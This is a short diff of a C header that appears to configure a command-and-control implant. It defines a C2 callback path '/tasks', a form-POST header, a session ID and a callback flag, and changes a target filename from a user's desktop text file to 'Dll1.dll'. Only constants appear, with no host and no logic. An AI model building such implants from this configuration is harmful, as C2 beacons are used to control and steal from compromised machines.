@@ -4,6 +4,6 @@
 #define _C2CALLBACK_URI L"/tasks"
 #define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
 #define _HEADER_LEN -1
-#define SESSION_ID "de8b8e118ea3c65ccd2074a1a352bc8e"
+#define SESSION_ID "f813f1acf8923cc004a7d25abdfd2ce9"
 #define DO_CALLBACK 0x4000
-#define FILENAME "C:\\Users\\thejoker\\Desktop\\user.txt" 
+#define FILENAME "Dll1.dll" 
